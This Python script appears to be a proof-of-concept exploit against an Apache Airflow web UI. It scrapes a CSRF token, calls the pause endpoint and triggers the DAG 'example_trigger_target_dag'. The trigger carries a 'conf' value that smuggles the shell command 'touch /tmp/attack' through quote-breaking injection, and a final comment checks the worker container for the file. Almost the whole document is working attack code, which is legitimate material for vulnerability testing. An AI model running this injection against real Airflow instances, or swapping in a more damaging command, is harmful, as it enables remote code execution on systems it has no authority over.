import requests
import re
from bs4 import BeautifulSoup
PORT = 8080
DB_PORT = 5432

def html_2_json(html_str):
    soup = BeautifulSoup(html_str, "html.parser")
    result = {}

    # 1. Extract CSRF tokens from common meta tags
    metas = soup.find_all("meta")
    csrf_meta = [
        meta
        for meta in metas
        if meta.get("name", "").lower()
        in {"csrf-token", "csrf_token", "_csrf", "xsrf-token", "x-csrf-token"}
    ]
    for meta in csrf_meta:
        result["csrf_token"] = meta.get("content")

    # 2. Extract CSRF and other security values from input elements
    # Common key list; extend as needed
    csrf_input_names = [
        "csrfmiddlewaretoken",
        "_csrf",
        "csrf_token",
        "csrf",
        "authenticity_token",
        "xsrf-token",
        "token",
        "requesttoken",
        "__c"
    ]
    for name in csrf_input_names:
        inp = soup.find("input", {"name": name})
        if inp and inp.get("value"):
            result["csrf_token"] = inp["value"]
            break  # Stop once one is found

    # 3. Handle key-value pairs such as <input name="project[namespace_id]" ...>
    # Extract all input elements that have a value attribute
    for inp in soup.find_all("input"):
        name = inp.get("name")
        value = inp.get("value")
        if name and value:
            # For example, name="project[namespace_id]"
            if "[" in name and "]" in name:
                key = name.split("[")[-1].replace("]", "")
                result[key] = value
            elif "token" in name.lower() or "id" in name.lower():
                # For example, input name="user_id"
                result[name] = value

    # 4. Extract JS objects from HTML text, such as "csrfToken": "xxxx" or 'csrfToken': 'xxxx'
    pattern_list = [
        r'"csrfToke[n]?"\s*:\s*["\']([^"\']+)["\']',  # "csrfToken": "xxx"
        r'name="_csrf"\s+value="([a-zA-Z0-9_\-]+)"',  # name="_csrf" value="xxx"
        r'name="csrfmiddlewaretoken"\s+value="([a-zA-Z0-9_\-]+)"',  # Django
        r'"x-csrf-token"\s*:\s*"([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'CSRF\s*=\s*"([^"]+)"',
        r'__c=([A-Za-z0-9]+)',
    ]
    for pattern in pattern_list:
        m = re.search(pattern, html_str, re.IGNORECASE)
        if m:
            result["csrf_token"] = m.group(1)
            break

    # 5. Other common cases can be extended in the same way...

    # 6. Add custom extraction for other key fields, such as namespace_id
    namespace_input = soup.find("input", {"name": "project[namespace_id]"})
    if namespace_input and namespace_input.get("value"):
        result["namespace_id"] = namespace_input["value"]

    # 7. Extract common hidden input parameters
    for inp in soup.find_all("input", {"type": "hidden"}):
        if inp.get("name") and inp.get("value"):
            if inp.get("name") not in result:
                result[inp.get("name")] = inp.get("value")

    # Return a dict or JSON string as needed
    return result  # To return JSON: json.dumps(result, ensure_ascii=False, indent=2)


def request_id(response):
    return response.headers.get("X-Request-Id")


def log_response(label, response, capture=True, include_history=True):
    responses = list(response.history) + [response] if include_history else [response]
    rid_label = "X-Request-Id" if capture else "RID"
    for index, item in enumerate(responses):
        suffix = "" if len(responses) == 1 else f" redirect[{index}]"
        print(
            f"{label}{suffix} {item.request.method} {item.request.url} "
            f"Code: {item.status_code} {rid_label}: {request_id(item)}"
        )


def main():
    session = requests.Session()
    # Step 1: get the CSRF token
    url1 = f"http://localhost:{PORT}/admin"
    resp0 = session.get(url1)
    log_response("GET /admin", resp0, capture=False)
    r0json = html_2_json(resp0.text)
    #print("Step 0 response json:", r0json)
    csrf_global = r0json["csrf_token"]
    print("Step 1 status:", resp0.status_code)

    # Step 2: unpause the DAG
    url2 = f"http://localhost:{PORT}/admin/airflow/paused"
    headers = {
        "X-CSRFToken": csrf_global,
    }
    params1 = {
        "is_paused": "true",
        "dag_id": "example_trigger_target_dag"
    }
    resp1 = session.post(url2, params=params1,headers=headers, allow_redirects=False)
    log_response("POST /admin/airflow/paused", resp1)
    if resp1.is_redirect:
        location = resp1.headers.get("Location", "/admin/")
        redirect_url = f"http://localhost:{PORT}{location}" if location.startswith("/") else location
        redirect_resp = session.get(redirect_url, allow_redirects=True)
        log_response("GET paused redirect", redirect_resp, capture=False)
    print("Step 2 status:", resp1.status_code)

    # Step 3: trigger DAG execution
    url3 = f"http://localhost:{PORT}/admin/airflow/trigger"
    conf_json = '{"message":"\'\\";touch /tmp/attack;#"}'
    print(conf_json)
    data3 = {
        "dag_id": "example_trigger_target_dag",
        "conf": conf_json,
        "csrf_token": csrf_global
    }
    resp3 = session.post(url3, data=data3, allow_redirects=False)
    log_response("POST /admin/airflow/trigger", resp3)
    print("Step 3 status:", resp3.status_code)


if __name__ == "__main__":
    main()

#docker exec -it airflow-airflow-worker-1 ls -l /tmp
